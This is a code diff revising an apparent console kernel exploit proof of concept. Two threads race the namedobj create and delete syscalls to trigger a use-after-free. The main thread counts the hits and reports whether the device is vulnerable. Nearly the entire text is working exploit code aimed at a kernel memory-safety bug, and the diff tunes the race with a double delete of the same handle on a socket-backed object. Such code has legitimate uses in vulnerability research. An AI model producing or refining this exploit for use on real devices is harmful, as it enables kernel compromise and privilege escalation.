@@ -3,79 +3,74 @@
 #define SYS_NAMEDOBJ_CREATE 557
 #define SYS_NAMEDOBJ_DELETE 558
 
-static int namedobj_create(const char* name, 
-                            int fd, 
+static int namedobj_create(const char* name,
+                            int data,
                             uint32_t flags) {
-    return syscall(SYS_NAMEDOBJ_CREATE, name, fd, flags);
+    return syscall(SYS_NAMEDOBJ_CREATE, name, data, flags);
 }
 
-static int namedobj_delete(uint32_t handle, 
+static int namedobj_delete(uint32_t handle,
                             uint16_t flags) {
     return syscall(SYS_NAMEDOBJ_DELETE, handle, flags);
 }
 
 static volatile int g_handle  = -1;
 static volatile int g_running =  1;
+static volatile int g_hits    =  0;
 
 void* thread_delete(void* arg) {
     printf_debug("thread_delete start\n");
-
     while (g_running) {
-        if (g_handle != -1) {
-            printf_debug("thread_delete saw handle\n");
+        int h = g_handle;
+        if (h == -1) continue;
 
-            int h    = g_handle;
-            int h1   = g_handle;
-            g_handle = -1;
+        g_handle = -1;
 
-            printf_debug("thread_delete deleting\n");
+        
+        int r1 = namedobj_delete(h, 0x107);
 
-            namedobj_delete(h, 0x107);
-            namedobj_delete(h1, 0x101);
+        int r2 = namedobj_delete(h, 0x107);
 
-            printf_debug("thread_delete deleted\n");
+        printf_debug("r1=%d r2=%d h=0x%x\n", r1, r2, h);
+
+        if (r2 == 0) {
+            g_hits++;
+            printf_debug("[!!!] UAF HIT #%d\n", g_hits);
         }
     }
-
     printf_debug("thread_delete exit\n");
     return NULL;
 }
 
 void* thread_create(void* arg) {
     printf_debug("thread_create start\n");
-
     while (g_running) {
-        SceKernelEqueue eq;
-
-        printf_debug("creating equeue\n");
-        sceKernelCreateEqueue(&eq, "poc");
-
-        int fd = (int)eq;
-
-        printf_debug("fd=%d\n", fd);
-
+        
+        int fd = sceNetSocket("poc",
+                              AF_INET,
+                              SOCK_STREAM, 0);
         if (fd < 0) continue;
 
-        int h = namedobj_create("poc", fd, 0x107);
-        int h1 = namedobj_create("poc", fd, 0x107);
-
-        printf_debug("handle=%d\n", h);
-
-        if (h != -1) {
-            g_handle = h;
-            h1 = g_handle;
-            printf_debug("handle stored\n");
+        int h = namedobj_create("poc_uaf", fd, 0x107);
+        if (h == -1) {
+            sceNetSocketClose(fd);
+            continue;
         }
-    }
 
+        g_handle = h;
+
+        
+        while (g_handle != -1 && g_running)
+            sceKernelUsleep(10);
+
+        sceNetSocketClose(fd);
+    }
     printf_debug("thread_create exit\n");
     return NULL;
 }
 
-int _main(struct thread *td)
-{
+int _main(struct thread *td) {
     UNUSED(td);
-
     initKernel();
     initLibc();
     initPthread();
@@ -84,28 +79,22 @@ int _main(struct thread *td)
     initSysUtil();
 
     ScePthread tA, tB;
+    printf_debug("=== namedobj test ===\n");
 
-    printf_debug("=== namedobj race ===\n");
+    scePthreadCreate(&tA, NULL, thread_create, NULL, "creator");
+    scePthreadCreate(&tB, NULL, thread_delete, NULL, "deleter");
 
-    printf_debug("creating thread_delete\n");
-    scePthreadCreate(&tA, NULL, thread_delete, NULL, "del");
-
-    printf_debug("creating thread_create\n");
-    scePthreadCreate(&tB, NULL, thread_create, NULL, "cre");
-
-    printf_debug("threads created\n");
-
-    sceKernelSleep(10);
-
-    printf_debug("stopping threads\n");
+    sceKernelSleep(30);
     g_running = 0;
 
     scePthreadJoin(tA, NULL);
     scePthreadJoin(tB, NULL);
 
-    printf_debug("joined threads\n");
-
-    printf_debug("=== namedobj Done ===\n");
+    printf_debug("Total hits: %d\n", g_hits);
+    if (g_hits > 0)
+        printf_debug("[+] VULNERABLE!\n");
+    else
+        printf_debug("[-] No hits\n");
 
     return 0;
 }
